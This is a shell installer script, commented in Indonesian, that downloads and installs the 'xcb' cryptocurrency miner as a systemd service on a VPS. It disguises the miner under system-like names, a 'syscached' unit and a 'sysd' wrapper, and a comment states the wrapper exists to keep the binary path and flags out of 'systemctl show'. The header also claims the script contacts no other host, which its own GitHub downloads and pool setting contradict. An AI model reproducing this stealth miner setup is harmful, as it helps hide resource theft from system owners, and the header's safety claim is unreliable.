#!/bin/sh
# install.sh — pasang xcb CONN di VPS baru dari tarball rilis.
#
# Dua cara pakai:
#   1. Dari tarball yang sudah diekstrak:
#        sudo ./install.sh --wallet <alamat> --worker <nama>
#   2. Unduh langsung dari GitHub Release:
#        sudo ./install.sh --version v1.0.0 --wallet <alamat> --worker <nama>
#
# Skrip ini hanya menyentuh host lokal: binary + library, /etc/xcb/miner.env,
# sysctl hugepages, wrapper sysd, dan unit syscached. Tidak menghubungi host lain.
set -eu

REPO="ylxai/xcb-v2"
PREFIX="/usr/local/bin"
WRAPPER="/usr/local/sbin/sysd"
CONF_DIR="/etc/xcb"
CONF="${CONF_DIR}/miner.env"
UNIT="/etc/systemd/system/syscached.service"
SVC="syscached"
SYSCTL_CONF="/etc/sysctl.d/99-miner-hugepages.conf"
POOL="eu.rplant.xyz:17194"

TAG=""
WALLET=""
WORKER=""
THREADS=""
FORCE=0
DRY=0
NO_HUGE=0

usage() {
    cat <<'EOF'
Usage: install.sh [opsi]

Sumber file:
  (tanpa --version)     pakai xcb + librandomx_v2.so di direktori skrip ini
  --version vX.Y.Z      unduh tarball rilis dari GitHub (atau "latest")

Konfigurasi miner:
  --wallet ADDR         alamat reward; wajib bila /etc/xcb/miner.env belum ada
  --worker NAMA         nama worker (default: hostname)
  --pool HOST:PORT      pool CONN (default: eu.rplant.xyz:17194)
  --threads N           jumlah thread (default: nproc)

Lainnya:
  --no-hugepages        jangan tulis sysctl hugepages
  --force               timpa /etc/xcb/miner.env yang sudah ada
  --dry-run             cetak rencana tanpa mengubah apa pun
  -h, --help            tampilkan bantuan ini
EOF
}

log() { printf '%s\n' "[install] $*"; }
die() { printf '%s\n' "[install] ERROR: $*" >&2; exit 1; }
run() {
    if [ "$DRY" -eq 1 ]; then
        printf '[dry-run] %s\n' "$*"
    else
        "$@"
    fi
}

while [ $# -gt 0 ]; do
    case "$1" in
        --version)   [ $# -ge 2 ] || die "--version butuh nilai"; TAG="$2"; shift 2 ;;
        --wallet)    [ $# -ge 2 ] || die "--wallet butuh nilai"; WALLET="$2"; shift 2 ;;
        --worker)    [ $# -ge 2 ] || die "--worker butuh nilai"; WORKER="$2"; shift 2 ;;
        --pool)      [ $# -ge 2 ] || die "--pool butuh nilai"; POOL="$2"; shift 2 ;;
        --threads)   [ $# -ge 2 ] || die "--threads butuh nilai"; THREADS="$2"; shift 2 ;;
        --no-hugepages) NO_HUGE=1; shift ;;
        --force)     FORCE=1; shift ;;
        --dry-run)   DRY=1; shift ;;
        -h|--help)   usage; exit 0 ;;
        *)           die "opsi tidak dikenal: $1 (lihat --help)" ;;
    esac
done

if [ "$DRY" -eq 0 ] && [ "$(id -u)" -ne 0 ]; then
    die "jalankan sebagai root: sudo $0 ..."
fi

[ "$(uname -s)" = "Linux" ] || die "skrip ini hanya untuk Linux"
[ "$(uname -m)" = "x86_64" ] || die "binary hanya tersedia untuk x86_64"

grep -qw avx2 /proc/cpuinfo || log "PERINGATAN: CPU tidak melaporkan avx2; hashrate akan rendah"
grep -qw aes /proc/cpuinfo || log "PERINGATAN: CPU tidak melaporkan aes; hashrate akan rendah"

MEM_MB=$(awk '/^MemTotal:/ {print int($2/1024)}' /proc/meminfo)
[ "$MEM_MB" -ge 3500 ] || log "PERINGATAN: RAM ${MEM_MB}MB; mode full butuh 2592MB + overhead"

if [ -z "$THREADS" ]; then
    THREADS=$(nproc 2>/dev/null || echo 1)
fi
case "$THREADS" in
    ''|*[!0-9]*) die "--threads harus angka" ;;
esac

WORK=""
cleanup() {
    if [ -n "$WORK" ]; then
        rm -rf "$WORK"
    fi
}
trap cleanup EXIT INT TERM

if [ -n "$TAG" ]; then
    command -v curl >/dev/null 2>&1 || die "curl tidak ditemukan"
    if [ "$TAG" = "latest" ]; then
        TAG=$(curl -fsSL "https://api.github.com/repos/${REPO}/releases/latest" \
            | sed -n 's/.*"tag_name":[[:space:]]*"\([^"]*\)".*/\1/p' | head -n 1)
        [ -n "$TAG" ] || die "tidak bisa membaca tag rilis terbaru"
        log "rilis terbaru: ${TAG}"
    fi
    FILE="xcb-${TAG}-linux-x86_64.tar.gz"
    URL="https://github.com/${REPO}/releases/download/${TAG}"
    WORK=$(mktemp -d)
    log "mengunduh ${FILE}"
    curl -fsSL -o "${WORK}/${FILE}" "${URL}/${FILE}"
    curl -fsSL -o "${WORK}/${FILE}.sha256" "${URL}/${FILE}.sha256"
    ( cd "$WORK" && sha256sum -c "${FILE}.sha256" ) || die "checksum tarball tidak cocok"
    tar -xzf "${WORK}/${FILE}" -C "$WORK"
    SRC="$WORK"
else
    SRC=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
    [ -f "${SRC}/xcb" ] || die "xcb tidak ada di ${SRC}; pakai --version vX.Y.Z"
    [ -f "${SRC}/librandomx_v2.so" ] || die "librandomx_v2.so tidak ada di ${SRC}"
    [ -f "${SRC}/SHA256SUMS" ] || die "SHA256SUMS tidak ada di ${SRC}"
    ( cd "$SRC" && sha256sum -c SHA256SUMS ) || die "checksum file tidak cocok"
fi

[ -f "${SRC}/syscached.service" ] || die "syscached.service tidak ada di ${SRC}; pakai tarball rilis"

if [ -n "$WALLET" ]; then
    case "$WALLET" in
        ISI_WALLET_CONN|CHANGE_ME) die "wallet masih placeholder" ;;
    esac
    if [ -f "$CONF" ] && [ "$FORCE" -eq 0 ]; then
        die "${CONF} sudah ada; pakai --force untuk menimpa"
    fi
elif [ ! -f "$CONF" ]; then
    die "instalasi baru butuh --wallet (atau sediakan ${CONF})"
fi

if [ -z "$WORKER" ]; then
    WORKER=$(hostname -s 2>/dev/null || hostname)
fi

if [ "$NO_HUGE" -eq 0 ]; then
    if [ "$DRY" -eq 1 ]; then
        printf '[dry-run] tulis %s (vm.nr_hugepages=1200, vm.max_map_count=262144)\n' "$SYSCTL_CONF"
    else
        printf 'vm.nr_hugepages=1200\nvm.max_map_count=262144\n' > "$SYSCTL_CONF"
        sysctl --system >/dev/null
        log "hugepages: $(awk '/^HugePages_Total:/ {print $2}' /proc/meminfo) halaman"
    fi
fi

STAMP=$(date -u +%Y%m%d-%H%M%S)
if [ -f "${PREFIX}/xcb" ]; then
    run cp -a "${PREFIX}/xcb" "${PREFIX}/xcb.bak-${STAMP}"
    if [ -f "${PREFIX}/librandomx_v2.so" ]; then
        run cp -a "${PREFIX}/librandomx_v2.so" "${PREFIX}/librandomx_v2.so.bak-${STAMP}"
    fi
    log "backup lama: ${PREFIX}/xcb.bak-${STAMP}"
fi

run install -d -m 0755 "$PREFIX"
run install -m 0755 "${SRC}/xcb" "${PREFIX}/xcb"
run install -m 0755 "${SRC}/librandomx_v2.so" "${PREFIX}/librandomx_v2.so"
if [ -f "${SRC}/VERSION" ]; then
    run install -m 0644 "${SRC}/VERSION" "${PREFIX}/VERSION"
fi

# Wrapper root-only supaya ExecStart dan `systemctl show` tidak memuat path
# binary atau flag. Isinya membaca WORKER/THREADS dari miner.env.
run install -d -m 0755 "$(dirname "$WRAPPER")"
if [ "$DRY" -eq 1 ]; then
    printf '[dry-run] tulis %s (0700)\n' "$WRAPPER"
else
    cat > "$WRAPPER" <<'EOF'
#!/bin/sh
exec /usr/local/bin/xcb -a conn --worker "$WORKER" -t "$THREADS" --ui=log
EOF
    chmod 0700 "$WRAPPER"
    log "wrapper: ${WRAPPER} (0700)"
fi

if [ -n "$WALLET" ]; then
    run install -d -m 0755 "$CONF_DIR"
    if [ "$DRY" -eq 1 ]; then
        printf '[dry-run] tulis %s (0600)\n' "$CONF"
    else
        (
            umask 077
            cat > "$CONF" <<EOF
CONN_POOL=${POOL}
WALLET=${WALLET}
WORKER=${WORKER}
THREADS=${THREADS}
EOF
        )
        chmod 0600 "$CONF"
        log "konfigurasi: ${CONF} (wallet ${WALLET}, worker ${WORKER}, ${THREADS} thread)"
    fi
fi

run install -m 0644 "${SRC}/syscached.service" "$UNIT"

if [ "$DRY" -eq 0 ]; then
    systemctl daemon-reload
    systemctl enable "$SVC" >/dev/null 2>&1 || true
    systemctl restart "$SVC"
    sleep 5
    log "status: $(systemctl is-active "$SVC")"
    log "cek log: journalctl -u ${SVC} -n 30 --no-pager"
    log "cek proses: ps -eo pid,ppid,comm,args | grep '[s]ysd'"
else
    log "dry-run selesai; tidak ada perubahan"
fi
